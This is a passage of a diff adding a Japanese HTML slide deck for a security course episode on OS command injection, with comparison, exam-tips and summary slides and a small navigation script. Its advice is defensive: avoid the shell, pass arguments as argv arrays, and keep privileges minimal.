+          <text x="150" y="100" text-anchor="middle" fill="#e7edf4" font-size="9.5" font-family="sans-serif"><strong>シェル／OS</strong> が別命令を実行</text>
+          <text x="150" y="128" text-anchor="middle" fill="#8b9cb3" font-size="8" font-family="sans-serif">第13回: ファイルパスを開く（読取）とは別軸</text>
+          <rect x="315" y="42" width="250" height="150" rx="10" fill="rgba(251,146,60,0.08)" stroke="#fb923c"/>
+          <text x="440" y="72" text-anchor="middle" fill="#fdba74" font-size="11" font-weight="800" font-family="sans-serif">SQLインジェクション</text>
+          <text x="440" y="100" text-anchor="middle" fill="#e7edf4" font-size="9.5" font-family="sans-serif"><strong>DB</strong> がクエリを誤解釈</text>
+          <text x="440" y="128" text-anchor="middle" fill="#8b9cb3" font-size="8" font-family="sans-serif">第5回の延長で復習</text>
+          <rect x="605" y="42" width="250" height="150" rx="10" fill="rgba(167,139,250,0.1)" stroke="#a78bfa"/>
+          <text x="730" y="72" text-anchor="middle" fill="#c4b5fd" font-size="11" font-weight="800" font-family="sans-serif">SSRF（第11回）</text>
+          <text x="730" y="100" text-anchor="middle" fill="#e7edf4" font-size="9.5" font-family="sans-serif"><strong>サーバがHTTP</strong> で取りに行く</text>
+          <text x="730" y="128" text-anchor="middle" fill="#8b9cb3" font-size="8" font-family="sans-serif">ローカルCLI実行とは別物</text>
+        </svg>
+      </div>
+    </section>
+
+    <!-- 12 exam -->
+    <section class="slide" data-i="12" data-yaml-scene="exam_tips" title="試験">
+      <span class="tag">試験でつまずきやすい所</span>
+      <h1>「禁止文字を除いたから安全」系の誘惑に乗らない</h1>
+      <h2>正しい記述は「シェル非使用」「argv 分離」「権限最小化」寄り</h2>
+      <div class="grid-2">
+        <div class="rich-box theme-warn">
+          <div class="box-title">① エスケープだけに頼る案</div>
+          <div class="box-desc">シェル種別・ロケール・クォートの組み合わせで抜ける話が教科書に載る。</div>
+        </div>
+        <div class="rich-box theme-warn">
+          <div class="box-title">② WAF 万能論</div>
+          <div class="box-desc">アプリがシェル1行を組み立てている限り、レイヤは別。根本は起動方法。</div>
+        </div>
+        <div class="rich-box theme-warn" style="grid-column:1/-1;">
+          <div class="box-title">③ 第13回との混同</div>
+          <div class="box-desc">パストラバーサル＝ファイル<strong>読取</strong>の経路。コマンド注入＝<strong>実行</strong>。問題文の動詞で切る。</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 13 summary -->
+    <section class="slide" data-i="13" data-yaml-scene="summary" title="まとめ">
+      <span class="tag">まとめ</span>
+      <h1>第14回まとめ — OSコマンドインジェクション</h1>
+      <h2>シェル・メタ文字・argv — の3語で復習する</h2>
+      <div class="summary-pillars" role="list">
+        <div class="summary-pillar" role="listitem">
+          <b>柱①</b>
+          ユーザー入力をシェル行に連結すると、区切り文字で別コマンドが実行される
+        </div>
+        <div class="summary-pillar" role="listitem">
+          <b>柱②</b>
+          ブラインドでも副作用で観測されることがある（対策の本質は同じ）
+        </div>
+        <div class="summary-pillar" role="listitem">
+          <b>柱③</b>
+          シェルを通さず起動／ホワイトリスト／最小権限で層を重ねる
+        </div>
+      </div>
+      <div class="summary-hero" role="region" aria-label="整理">
+        <p class="summary-hero__label">1行（口頭チェック）</p>
+        <p class="summary-hero__p">攻撃：<strong>1行のシェル文法</strong>にユーザー入力を載せ、意図しないプロセスを起こす。</p>
+        <p class="summary-hero__p">対策：<strong>シェル非使用の exec</strong>・<strong>argv 配列</strong>・機能と権限の削減。</p>
+      </div>
+      <p class="summary-section-h">自習</p>
+      <ul class="bullets">
+        <li>手元の言語で「文字列1本で外部プロセス起動するAPI」と「argv 配列で起動するAPI」をペアで調べる。</li>
+        <li>第5回（SQLi）・第11回（SSRF）・第13回（パス）と、今日の「効くエンジン」を表にして書き比べる。</li>
+        <li>台本 <code style="color:#fdba74;font-family:var(--mono);font-size:0.85rem">s01-ep14-command-injection.yaml</code> と並べて再生。</li>
+      </ul>
+      <aside class="summary-prev" aria-label="前回">
+        <span class="summary-prev__tag">第13回との対比</span>
+        <code style="color:#fdba74;font-family:var(--mono)">ディレクトリトラバーサル</code> — 公開外ファイルの読取。今回はシェル経由の<strong>任意コマンド実行</strong>。
+      </aside>
+    </section>
+
+  </div>
+
+  <div class="toolbar">
+    <button type="button" id="prev">← 前へ</button>
+    <div style="display:flex; flex-direction:column; align-items:center; gap:0.2rem; flex:1; min-width:0; max-width:55%;">
+      <span class="progress" id="prog">1 / 13</span>
+      <span class="progress" id="scene-ref" style="font-size:0.72rem; color:#fdba74; line-height:1.25; text-align:center; word-break:break-all;" title="s01-ep14-command-injection.yaml">台本 id: incident</span>
+    </div>
+    <button type="button" id="next">次へ →</button>
+  </div>
+
+  <script>
+    (function () {
+      var slides = Array.prototype.slice.call(document.querySelectorAll(".slide"));
+      var idx = 0;
+      var prog = document.getElementById("prog");
+      var sceneRef = document.getElementById("scene-ref");
+      var btnPrev = document.getElementById("prev");
+      var btnNext = document.getElementById("next");
+      function show(i) {
+        idx = Math.max(0, Math.min(i, slides.length - 1));
+        slides.forEach(function (s, j) { s.classList.toggle("active", j === idx); });
+        prog.textContent = idx + 1 + " / " + slides.length;
+        if (sceneRef) {
+          var sc = slides[idx].getAttribute("data-yaml-scene");
+          var human = sc ? sc.split(",").map(function (x) { return x.trim(); }).join(" ＋ ") : "";
+          sceneRef.textContent = sc ? "台本 id: " + human : "";
+        }
+        btnPrev.disabled = idx === 0;
+        btnNext.disabled = idx === slides.length - 1;
+      }
+      btnPrev.addEventListener("click", function () { show(idx - 1); });
+      btnNext.addEventListener("click", function () { show(idx + 1); });
+      document.addEventListener("keydown", function (e) {
+        if (e.key === "ArrowRight" || e.key === " ") { e.preventDefault(); show(idx + 1); }
+        else if (e.key === "ArrowLeft") { e.preventDefault(); show(idx - 1); }
+      });
+      show(0);
+    })();
+  </script>
+</body>
+</html>
